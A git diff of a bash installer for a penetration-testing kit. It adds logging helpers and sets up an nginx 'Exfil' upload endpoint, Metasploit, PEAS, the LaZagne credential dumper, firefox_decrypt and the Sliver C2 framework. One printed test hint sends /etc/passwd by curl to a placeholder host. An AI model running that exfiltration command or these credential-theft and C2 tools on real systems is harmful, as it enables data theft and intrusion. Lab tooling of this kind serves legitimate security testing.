@@ -7,55 +7,118 @@ kit_location="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
 RED='${RED}'
 GREEN='${GREEN}'
 BLUE='\033[0;34m'
-NC=' ${NC}' # No Color
+NC='\033[0m' # No Color
+kit_log="${kit_location}/kit_log.txt"
 
 
 source bash_tools.txt
 
+# Catch Ctrl+C and die
+trap "echo -e '\nTerminated by Ctrl+C'; exit" SIGINT
+
+# Configure the error_handler function to catch errors. Definied below print_message.
+trap 'error_handler $? $LINENO' ERR
+
+# Pass args to this function like so:
+#
+# print_message [good|bad|info] "message you want output" "additional optional"
+#
+# Success messages should be "good". Will output with [*] in front
+# Failure or error should be "bad". Will output with [!] in front
+# Other information should be "info". Will output with [+] in front
+# Extra debug-level detail should be "debug". Will output with DEBUG: in front
+function print_message {
+    # Print the provided message with pretty colors and a datetime stamp
+    case $1 in
+        good|green|success)
+            echo -e "${GREEN}[*] $(date +%Y-%m-%dT%H:%M:%S:%Z) : ${@:2}${NC}\n" | tee -a "${kit_log}"
+            ;;
+        bad|error|red)
+            echo -e "${RED}[!] $(date +%Y-%m-%dT%H:%M:%S:%Z) : ${@:2}${NC}\n" | tee -a "${kit_log}"
+            ;;
+        info)
+            echo -e "${BLUE}[+] $(date +%Y-%m-%dT%H:%M:%S:%Z) : ${@:2}${NC}\n" | tee -a "${kit_log}"
+            ;;
+        debug)
+            if [ "$debug" == "true" ]; then
+                echo -e "${BLUE}DEBUG: $(date +%Y-%m-%dT%H:%M:%S:%Z) : ${@:2}${NC}\n" | tee -a "${kit_log}"
+            fi
+            ;;
+        *)
+            echo -e "${RED}Invalid message type passed to print_message function: $1${NC}\n" | tee -a "${kit_log}"
+            exit 1
+            ;;
+    esac
+}
+
+# Error handling function
+# Expects error code as $1 and the $LINENO env variable as $2
+error_handler(){
+    print_message "red" "Error: ($1) occured on $2"
+    #echo "${RED}Error: ($1) occured on $2${NC}"
+}
+    
+# Function to run things and log them
+# It expects everything passed to it to be a command and its arguements
+run_and_log() {
+    # If debug, print messages and command output to terminal
+    if [ "$debug" == "true" ]; then
+        print_message "debug" "RUNNING: ${@}"
+        "$@" 2>&1 | tee -a "${kit_log}"
+    # If no debug, just put in log
+    else
+        "$@" >> "${kit_log}" 2>&1
+    fi
+}
 
 function nginx_config {
     # Used to create an NGINX proxy for apache for web exfiltration 
-    sudo mkdir -p /var/www/uploads/Exfil
-    sudo chown -R www-data:www-data /var/www/uploads/Exfil
-    sudo cp ./upload.conf /etc/nginx/sites-available/upload.conf
+    run_and_log sudo mkdir -p /var/www/uploads/Exfil
+    run_and_log sudo chown -R www-data:www-data /var/www/uploads/Exfil
+    run_and_log sudo cp ./upload.conf /etc/nginx/sites-available/upload.conf
     if [[ ! -e "/etc/nginx/sites-enabled/upload.conf" ]]; then
-        sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
+        run_and_log sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
     fi
-    sudo systemctl restart nginx.service
-    sudo rm /etc/nginx/sites-enabled/default
+    run_and_log sudo systemctl restart nginx.service
+    run_and_log sudo rm /etc/nginx/sites-enabled/default
     # Usage
-    echo -e "${GREEN}NGINX has been setup. To test the upload, try:${NC}\n"
-    echo -e "${GREEN}curl -T /etc/passwd http://<ip>:8443/Exfil/testfile.txt ; tail -n 1 /var/www/uploads/Exfil/testfile.txt ${NC}\n"
+    print_message "good" "NGINX has been setup. To test the upload, try:"
+    print_message "good" "curl -T /etc/passwd http://<ip>:8443/Exfil/testfile.txt ; tail -n 1 /var/www/uploads/Exfil/testfile.txt"
 }
 
 
 function msfdb_init {
     # TODO: Check and make sure the msfdb is actually up and running (msfdb run)
-    sudo systemctl start postgresql
-    systemctl status postgresql
-    sudo msfdb init
-    echo "MSF Database Initialized"
-    echo "Creating msfconsole.rc file"
-    cp "${kit_location}/msfconsole.rc" "${HOME}/.msf4/msfconsole.rc"
-    echo -e "\nHere is the status of msfdb:\n"
-    sudo msfdb status
+    print_message "info" "Initializing MSF database"
+    run_and_log sudo systemctl start postgresql
+    run_and_log systemctl status postgresql
+    run_and_log sudo msfdb init
+    #echo "MSF Database Initialized"
+    print_message "green" "MSF Database Initialized"
+    print_message "info" "Creating msfconsole.rc file"
+    run_and_log cp "${kit_location}/msfconsole.rc" "${HOME}/.msf4/msfconsole.rc"
+    print_message "info" "Here is the status of msfdb:"
+    run_and_log sudo msfdb status
 }
 
 function neo4j_init {
     # TODO: Grab the port/service information and present to the user
-    sudo mkdir -p /usr/share/neo4j/logs
-    sudo touch /usr/share/neo4j/logs/neo4j.log
-    sudo neo4j start
-    echo "Neo4j service initialized"
+    run_and_log sudo mkdir -p /usr/share/neo4j/logs
+    run_and_log sudo touch /usr/share/neo4j/logs/neo4j.log
+    run_and_log sudo neo4j start
+    print_message "green" "Neo4j service initialized"
 }
 
 function peas_download {
     # For the time being - just scrub the PEAS directory and re-obtain
     if [[ -d "${dldir}/PEAS" ]]; then
         # Lol, risky
-        sudo rm -rf "${dldir}/PEAS"
+        print_message "debug" "rm -rf ${dldir}/PEAS"
+        run_and_log sudo rm -rf "${dldir}/PEAS"
+        print_message "debug" "grab_peas"
         grab_peas
     else
+        print_message "debug" "grab_peas"
         grab_peas
     fi
 }
@@ -64,11 +127,16 @@ function grab_peas {
     linpeas_sh='https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh'
     winpeas_bat='https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat'
     winpeas_exe='https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe'
-    sudo mkdir "${dldir}/PEAS"
-    sudo wget -qO "${dldir}/PEAS/linpeas.sh" "${linpeas_sh}"
-    sudo chmod +x "${dldir}/PEAS/linpeas.sh"
-    sudo wget -qO "${dldir}/PEAS/winpeas.bat" "${winpeas_bat}"
-    sudo wget -qO "${dldir}/PEAS/winpeas.exe" "${winpeas_exe}"
+    print_message "debug" "sudo mkdir \"${dldir}/PEAS\""
+    run_and_log sudo mkdir "${dldir}/PEAS"
+    print_message "debug" "sudo wget -qO \"${dldir}/PEAS/linpeas.sh\" \"${linpeas_sh}\""
+    run_and_log sudo wget -qO "${dldir}/PEAS/linpeas.sh" "${linpeas_sh}"
+    print_message "debug" "sudo chmod +x \"${dldir}/PEAS/linpeas.sh\""
+    run_and_log sudo chmod +x "${dldir}/PEAS/linpeas.sh"
+    print_message "debug" "sudo wget -qO \"${dldir}/PEAS/winpeas.bat\" \"${winpeas_bat}\""
+    run_and_log sudo wget -qO "${dldir}/PEAS/winpeas.bat" "${winpeas_bat}"
+    print_message "debug" "sudo wget -qO \"${dldir}/PEAS/winpeas.exe\" \"${winpeas_exe}\""
+    run_and_log sudo wget -qO "${dldir}/PEAS/winpeas.exe" "${winpeas_exe}"
 }
 
 
@@ -78,10 +146,10 @@ tool_install() {
     
     # Temp method to grab lazagne and the old firefox decrypt for python2
     lazagne_exe='https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe'
-    sudo wget "$lazagne_exe" -qO "$dldir/lazagne.exe"
+    run_and_log sudo wget "$lazagne_exe" -qO "$dldir/lazagne.exe"
     
     ff_decrypt_old='https://github.com/unode/firefox_decrypt/archive/refs/tags/0.7.0.zip'
-    sudo wget "$ff_decrypt_old" -qO "$dldir/FirefoxDecrypt_ForPython2"
+    run_and_log sudo wget "$ff_decrypt_old" -qO "$dldir/FirefoxDecrypt_ForPython2"
     
     # End temp method
     
@@ -91,7 +159,7 @@ tool_install() {
                 return 0
             fi
         else
-            echo -e "${RED}INVALID URL: $1 ${NC}"
+            print_message "bad" "INVALID URL: $1"
             # Returning 0 here because if the url isn't valid, then we definitely don't want to try installing
             return 0
         fi
@@ -99,17 +167,21 @@ tool_install() {
     }
     
     for git_url in "${GITHUBS[@]}"; do
-        echo "Checking for local install of: $git_url"
+        print_message "debug" "Checking for local install of: $git_url"
         if is_repo_installed "$git_url"; then
-            echo -e "${GREEN}Found in current directory, continuing...\n ${NC}"
+            print_message "good" "Found $git_url in current directory, continuing..."
         else
-            git clone "$git_url"
-            echo -e "${GREEN}Repo cloned! Moving on... \n ${NC}"
+            run_and_log git clone -q "$git_url"
+            if [ $? -eq 0 ]; then
+                print_message "green" "Repo cloned: $git_url -- Moving on..."
+            else
+                print_message "red" "Failed to clone repo $git_url" "Exit code:$?\n"
+            fi
         fi
     done
     
     # Begin installing pypi & apt packages
-    apt_command_string="sudo /usr/bin/apt install "
+    apt_command_string="sudo /usr/bin/apt install -y "
     for pkg in "${APT_PACKAGES[@]}"; do
         apt_command_string+="$pkg "
     done
@@ -118,51 +190,50 @@ tool_install() {
     apt_return_code=$?
     
     if [ "$apt_return_code" -ne 0 ]; then
-        echo -e "${RED}[!] apt encountered an error while running. Information follows ${NC}"
-        echo -e "${RED}apt return code: $apt_return_code ${NC}"
-        echo -e "\033[0;37mapt stdout:\n$apt_install_subproc ${NC}"
+        print_message "red" "apt encountered an error while running. apt return code: $apt_return_code"
+        print_message "red" "apt stdout:\n$apt_install_subproc"
     else
-        echo -e "${GREEN}[*] apt installed packages successfully ${NC}"
+        print_message "green" "apt installed packages successfully"
     fi
     
     for pkg in "${PYPI_PACKAGES[@]}"; do
-        pip3 install "$pkg" 1>/dev/null
-        echo -e "${GREEN}PYPI $pkg successfully installed by script ${NC}"
+        run_and_log pip3 install "$pkg" 1>/dev/null
+        print_message "green" "PYPI $pkg successfully installed"
     done
     
     peas_download
-    sudo ln -s "$dldir/nmapAutomator/nmapAutomator.sh" /usr/local/bin/ && sudo chmod +x "$dldir/nmapAutomator/nmapAutomator.sh"
+    run_and_log sudo ln -s "$dldir/nmapAutomator/nmapAutomator.sh" /usr/local/bin/ && sudo chmod +x "$dldir/nmapAutomator/nmapAutomator.sh"
     
-    echo "tool_install() Completed"
+    print_message "green" "tool_install() Completed"
     return 0
 }
 
 
 tool_update() {
     nmap_update() {
-        echo "Updating nmap script database"
-        sudo nmap --script-updatedb 1>/dev/null
-        echo -e "${GREEN}nmap script database updated \n ${NC}"
+        print_message "info" "Updating nmap script database"
+        run_and_log sudo nmap --script-updatedb 1>/dev/null
+        print_message "green" "nmap script database updated"
     }
 
     rockyou() {
-        echo "Checking if rockyou has been unzipped..."
+        print_message "info" "Checking if rockyou has been unzipped..."
         if [ -f "/usr/share/wordlists/rockyou.txt.gz" ]; then
-            echo "It hasn't been decompressed - decompressing now..."
-            sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+            print_message "green" "It hasn't been decompressed - decompressing now..."
+            run_and_log sudo gunzip /usr/share/wordlists/rockyou.txt.gz
         else
-            echo -e "${GREEN}rockyou has already been unzipped ${NC}"
-            echo -e "${GREEN}Software & Tool updates have been completed! ${NC}"
+            print_message "green" "rockyou has already been unzipped"
+            print_message "green" "Software & Tool updates have been completed!"
         fi
     }
 
-    echo "Updating searchsploit DB...."
-    sudo searchsploit -u
-    echo -e "${GREEN}Finished searchsploit update ${NC}"
+    print_message "info" "Updating searchsploit DB. Please be patient, this may take a while..."
+    run_and_log sudo searchsploit -u
+    print_message "green" "Finished searchsploit update"
 
-    echo "Updating locate DB..."
-    sudo updatedb
-    echo -e "${GREEN}Finished locate DB update ${NC}"
+    print_message "info" "Updating locate DB..."
+    run_and_log sudo updatedb
+    print_message "green" "Finished locate DB update"
 
     nmap_update
     rockyou
@@ -175,25 +246,25 @@ c2_sliver_install() {
     # variable used for saving files
     c2_sliver_download_directory="$dldir/C2Frameworks"
 
-    echo -e "${GREEN}[*] sliver: Installing sliver... ${NC}"
+    print_message "green" "sliver: Installing sliver..."
 
     # Try to install mingw-w64 package for more advanced features
-    echo -e "${GREEN}[*] sliver: Installing mingw-w64 through apt ${NC}"
-    sudo apt install -y mingw-w64 2>/dev/null 1>/dev/null
+    print_message "green" "sliver: Installing mingw-w64 through apt"
+    run_and_log sudo apt install -y mingw-w64
 
     # Clone source repo
-    echo -e "${GREEN}[*] sliver: Cloning source and Wiki repos to $c2_sliver_download_directory ${NC}"
-    git clone --quiet https://github.com/BishopFox/sliver.git "$c2_sliver_download_directory/sliver.git" 2>/dev/null >/dev/null
+    print_message "green" "sliver: Cloning source and Wiki repos to $c2_sliver_download_directory"
+    run_and_log git clone --quiet https://github.com/BishopFox/sliver.git "$c2_sliver_download_directory/sliver.git"
     # Wiki for documentation reference
-    git clone --quiet https://github.com/BishopFox/sliver.wiki.git "$c2_sliver_download_directory/sliver.wiki.git" 2>/dev/null >/dev/null
+    run_and_log git clone --quiet https://github.com/BishopFox/sliver.wiki.git "$c2_sliver_download_directory/sliver.wiki.git"
 
     # Binary releases
-    echo -e "${GREEN}[*] sliver: Downloading latest pre-compiled binary releases ${NC}"
-    wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux -qP "$c2_sliver_download_directory"
-    wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-client_linux -qP "$c2_sliver_download_directory"
-    wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-client_windows.exe -qP "$c2_sliver_download_directory"
+    print_message "green" "sliver: Downloading latest pre-compiled binary releases"
+    run_and_log wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux -qP "$c2_sliver_download_directory"
+    run_and_log wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-client_linux -qP "$c2_sliver_download_directory"
+    run_and_log wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-client_windows.exe -qP "$c2_sliver_download_directory"
 
-    echo -e "${GREEN}[*] sliver: Installation complete. ${NC}"
+    print_message "green" "sliver: Installation complete."
     return 0
 }
 
@@ -205,16 +276,18 @@ hostfilereset() {
 ::1     localhost ip6-localhost ip6-loopback
 ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters" > /etc/hosts
+    print_message "green" "Your /etc/hosts file has been reset"
 }
 
-structure_setup () {
+structure_setup() {
     DIRS=("Linux" "Windows" "ActiveDirectory" "C2Frameworks" "Packages")
     for dir in "${DIRS[@]}"; do
         if [[ -d "${dldir}/${dir}" ]]; then
-            echo "${dir} FOLDER EXISTS"
+            print_message "debug" "${dir} FOLDER EXISTS"
         else
-            mkdir "${dldir}/${dir}"
-            echo "created the ${dir} directory"
+            print_message "debug" "Making ${dldir}/${dir}"
+            run_and_log mkdir "${dldir}/${dir}"
+            print_message "debug" "created the ${dir} directory"
         fi
     done
 }
@@ -222,49 +295,106 @@ structure_setup () {
 
 sublime_install() {
     sublime='https://download.sublimetext.com/sublime-text_build-3211_amd64.deb'
-    wget -qO "${dldir}/sublime.deb" "${sublime}"
-    sudo dpkg -i "${dldir}/sublime.deb"
+    print_message "info" "Installing Sublime text"
+    print_message "debug" "wget -qO \"${dldir}/sublime.deb\" \"${sublime}\""
+    run_and_log wget -qO "${dldir}/sublime.deb" "${sublime}"
+    print_message "debug" "sudo dpkg -i \"${dldir}/sublime.deb\""
+    # sudo dpkg -i "${dldir}/sublime.deb"
+    dpkg_sublime_install_subproc=$(sudo /bin/bash -c "sudo dpkg -i \"${dldir}/sublime.deb\" 2>&1")
+    dpkg_sublime_install_return=$?
+
+    if [ "$dpkg_sublime_install_return" -ne 0 ]; then
+        print_message "red" "'sudo dpkg -i \"${dldir}/sublime.deb\"' encountered an error while running. return code: $apt_return_code"
+        print_message "red" "'sudo dpkg -i \"${dldir}/sublime.deb\"' stdout:\n$dpkg_sublime_install_subproc"
+    else
+        print_message "debug" "'sudo dpkg -i \"${dldir}/sublime.deb\"' stdout:\n$dpkg_sublime_install_subproc"
+        print_message "green" "Sublime text installed"
+    fi
+
 }
 
 vscodium_install() {
     # Download the public GPG key for the repo and package if hasn't been downloaded already
+    print_message "info" "Installing VSCodium"
     if [ ! -f '/usr/share/keyrings/vscodium-archive-keyring.gpg' ]; then
-        echo -e "${GREEN} [*] Adding VSCodium GPG key to filesystem (within /usr/share/keyrings/)${NC}"
-        wget -qO - https://gitlab.com/paulcarroty/vscodium-deb-rpm-repo/raw/master/pub.gpg | gpg --dearmor | sudo dd of=/usr/share/keyrings/vscodium-archive-keyring.gpg 2>/dev/null
+        print_message "info" "Downloading and adding VSCodium GPG key to filesystem (within /usr/share/keyrings/)"
+        run_and_log wget -qO - https://gitlab.com/paulcarroty/vscodium-deb-rpm-repo/raw/master/pub.gpg | gpg --dearmor | sudo dd of=/usr/share/keyrings/vscodium-archive-keyring.gpg 2>/dev/null
     else
-        echo -e "${GREEN} [*] VSCodium GPG key already downloaded${NC}"
+        print_message "info" "VSCodium GPG key already downloaded"
     fi
 
     # Add the repository if it hasn't been already
     if [ ! -f '/etc/apt/sources.list.d/vscodium.list' ]; then
-        echo -e "${GREEN} [*] Adding VSCodium repository to apt repos in /etc/apt/sources.list.d/${NC}"
-        echo 'deb [ signed-by=/usr/share/keyrings/vscodium-archive-keyring.gpg ] https://paulcarroty.gitlab.io/vscodium-deb-rpm-repo/debs vscodium main' | sudo tee /etc/apt/sources.list.d/vscodium.list 1>/dev/null
+        print_message "info" "Adding VSCodium repository to apt repos in /etc/apt/sources.list.d/"
+        echo 'deb [ signed-by=/usr/share/keyrings/vscodium-archive-keyring.gpg ] https://paulcarroty.gitlab.io/vscodium-deb-rpm-repo/debs vscodium main' | run_and_log sudo tee /etc/apt/sources.list.d/vscodium.list
     else
-        echo -e "${GREEN} [*] VSCodium repository already added${NC}"
+        print_message "info" "VSCodium repository was already added"
     fi
 
     # Refresh available packages and install codium
-    echo -e "${GREEN} [*] Installing VSCodium from repository${NC}"
-    sudo apt update 2>/dev/null 1>/dev/null && sudo apt install codium -y 2>/dev/null 1>/dev/null
-    echo -e "${GREEN} [*] VSCodium installed${NC}"
+    print_message "info" "Installing VSCodium from repository"
+    run_and_log sudo apt update
+    run_and_log sudo apt install codium -y
+    print_message "green" "VSCodium installed"
 }
 
 
 system_update() {
-    echo -e "${BLUE}Beginning System updates, please wait...${NC}"
+    print_message "info" "Beginning System updates, please wait..."
+    
+    apt_update_subproc=$(sudo /bin/bash -c "sudo apt update -y" 2>&1)
+    apt_update_return_code=$?
+    
+    if [ "$apt_update_return_code" -ne 0 ]; then
+        print_message "red" "'apt update' encountered an error while running. 'apt update' return code: $apt_return_code"
+        print_message "red" "'apt update' stdout:\n$apt_update_subproc"
+    else
+        print_message "debug" "'apt update' stdout:\n$apt_update_subproc"
+        print_message "debug" "'apt update' ran successfully"
+    fi
+
+    apt_upgrade_subproc=$(sudo /bin/bash -c "sudo apt upgrade -y" 2>&1)
+    apt_upgrade_return_code=$?
+    
+    if [ "$apt_upgrade_return_code" -ne 0 ]; then
+        print_message "red" "'apt upgrade' encountered an error while running. 'apt upgrade' return code: $apt_return_code"
+        print_message "red" "'apt upgrade' stdout:\n$apt_upgrade_subproc"
+    else
+        print_message "debug" "'apt upgrade' stdout:\n$apt_upgrade_subproc"
+        print_message "debug" "'apt upgrade' ran successfully"
+    fi
+
+    apt_pip_install_subproc=$(sudo /bin/bash -c "sudo apt install python3-pip -y" 2>&1)
+    apt_pip_install_return_code=$?
+    
+    if [ "$apt_pip_install_return_code" -ne 0 ]; then
+        print_message "red" "'apt install python3-pip' encountered an error while running. 'apt install python3-pip' return code: $apt_return_code"
+        print_message "red" "'apt install python3-pip' stdout:\n$apt_pip_install_subproc"
+    else
+        print_message "debug" "'apt install python3-pip' stdout:\n$apt_pip_install_subproc"
+        print_message "debug" "'apt install python3-pip' ran successfully"
+    fi
+
+    apt_autoremove_subproc=$(sudo /bin/bash -c "sudo apt autoremove -y" 2>&1)
+    apt_autoremove_return_code=$?
+    
+    if [ "$apt_autoremove_return_code" -ne 0 ]; then
+        print_message "red" "'apt autoremove' encountered an error while running. 'apt autoremove' return code: $apt_return_code"
+        print_message "red" "'apt autoremove' stdout:\n$apt_autoremove_subproc"
+    else
+        print_message "debug" "'apt autoremove' stdout:\n$apt_autoremove_subproc"
+        print_message "debug" "'apt autoremove' ran successfully"
+    fi
+
     sublime_install
     vscodium_install
     tool_install
     tool_update
-    sudo apt install python3-pip -y
-    sudo apt update -y
-    sudo apt upgrade -y
-    sudo apt autoremove -y
 
-    echo -e "${BLUE}Starting SSH service ...${NC}"
-    sudo service ssh start
+    print_message "info" "Starting SSH service ..."
+    run_and_log sudo service ssh start
 
-    echo -e "${GREEN}Finished SYSTEM setup${NC}"
+    print_message "good" "Finished SYSTEM setup"
 }
 
 #Throw test cases into here, invoke with -test
